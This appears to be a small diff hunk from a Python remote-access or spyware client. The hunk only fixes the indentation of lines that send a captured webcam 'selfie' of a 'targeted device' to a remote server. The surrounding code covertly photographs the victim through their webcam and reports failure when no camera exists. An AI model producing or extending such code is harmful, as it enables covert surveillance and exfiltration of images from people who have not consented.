@@ -172,9 +172,9 @@ while True:
             else:
                 send_to_server("Failed to capture selfie. It can be for the targeted device doesn't have any web cam installed in his Machine")
             cam.release()
-                imgname = "selfie.png"
-                imgsize = os.path.getsize(imgname)
-                client.send(f"SELFIE {imgname} {imgsize}".encode())
+            imgname = "selfie.png"
+            imgsize = os.path.getsize(imgname)
+            client.send(f"SELFIE {imgname} {imgsize}".encode())
 
             time.sleep(1)
 
